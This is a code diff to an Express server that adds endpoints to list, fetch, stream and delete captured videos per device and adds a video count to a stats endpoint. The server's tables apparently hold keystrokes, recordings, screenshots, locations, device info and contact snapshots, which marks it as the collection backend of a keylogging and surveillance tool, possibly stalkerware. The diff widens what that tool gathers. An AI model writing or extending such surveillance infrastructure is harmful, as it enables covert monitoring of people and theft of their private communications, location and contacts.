@@ -364,6 +364,67 @@ app.delete('/api/locations/:id', async (req, res) => {
 });
 
 // ═════════════════════════════════════════════════════════════════════════════
+// VIDEOS
+// ═════════════════════════════════════════════════════════════════════════════
+
+app.get('/api/videos', async (req, res) => {
+  try {
+    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
+    const limit = Math.min(50, parseInt(req.query.limit, 10) || 12);
+    const offset = (page - 1) * limit;
+    const [d, c] = await Promise.all([
+      pool.query(`SELECT id, size_bytes, mime_type, device_id, captured_at FROM videos ORDER BY captured_at DESC LIMIT $1 OFFSET $2`, [limit, offset]),
+      pool.query(`SELECT COUNT(*) AS total FROM videos`),
+    ]);
+    res.json({ videos: d.rows, pagination: { page, limit, total: parseInt(c.rows[0].total, 10), totalPages: Math.ceil(parseInt(c.rows[0].total, 10) / limit) } });
+  } catch (err) {
+    console.error('GET /api/videos error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.get('/api/videos/:id', async (req, res) => {
+  try {
+    const r = await pool.query(`SELECT id, video_data, size_bytes, mime_type, device_id, captured_at FROM videos WHERE id = $1`, [req.params.id]);
+    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
+    const vid = r.rows[0];
+    res.json({ video: { id: vid.id, video_b64: vid.video_data ? Buffer.from(vid.video_data).toString('base64') : null, size_bytes: vid.size_bytes, mime_type: vid.mime_type, device_id: vid.device_id, captured_at: vid.captured_at } });
+  } catch (err) {
+    console.error('GET /api/videos/:id error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.get('/api/videos/:id/stream', async (req, res) => {
+  try {
+    const r = await pool.query(`SELECT video_data, size_bytes, mime_type FROM videos WHERE id = $1`, [req.params.id]);
+    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
+    const vid = r.rows[0];
+    if (!vid.video_data) return res.status(404).json({ error: 'No video data' });
+    const buf = Buffer.from(vid.video_data);
+    const mime = vid.mime_type || 'video/mp4';
+    res.setHeader('Content-Type', mime);
+    res.setHeader('Content-Length', buf.length);
+    res.setHeader('Content-Disposition', `inline; filename="video_${req.params.id}.mp4"`);
+    res.send(buf);
+  } catch (err) {
+    console.error('GET /api/videos/:id/stream error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.delete('/api/videos/:id', async (req, res) => {
+  try {
+    const r = await pool.query(`DELETE FROM videos WHERE id = $1 RETURNING id`, [req.params.id]);
+    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
+    res.json({ message: 'Deleted', id: r.rows[0].id });
+  } catch (err) {
+    console.error('DELETE /api/videos/:id error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ═════════════════════════════════════════════════════════════════════════════
 // DEVICES
 // ═════════════════════════════════════════════════════════════════════════════
 
@@ -386,15 +447,16 @@ app.get('/api/devices', async (req, res) => {
 
 app.get('/api/stats', async (req, res) => {
   try {
-    const [k, rec, ss, loc, dev, con] = await Promise.all([
+    const [k, rec, ss, loc, dev, con, vid] = await Promise.all([
       pool.query('SELECT COUNT(*) AS total, COALESCE(SUM(char_length),0) AS chars FROM keystrokes'),
       pool.query('SELECT COUNT(*) AS total FROM recordings'),
       pool.query('SELECT COUNT(*) AS total FROM screenshots'),
       pool.query('SELECT COUNT(*) AS total FROM locations'),
       pool.query('SELECT COUNT(*) AS total FROM device_info'),
       pool.query('SELECT COUNT(*) AS total FROM contacts_snapshot'),
+      pool.query('SELECT COUNT(*) AS total FROM videos'),
     ]);
-    res.json({ keystrokes: k.rows[0], recordings: rec.rows[0], screenshots: ss.rows[0], locations: loc.rows[0], devices: dev.rows[0], contacts_snapshots: con.rows[0] });
+    res.json({ keystrokes: k.rows[0], recordings: rec.rows[0], screenshots: ss.rows[0], locations: loc.rows[0], devices: dev.rows[0], contacts_snapshots: con.rows[0], videos: vid.rows[0] });
   } catch (err) {
     console.error('GET /api/stats error:', err);
     res.status(500).json({ error: 'Internal server error' });
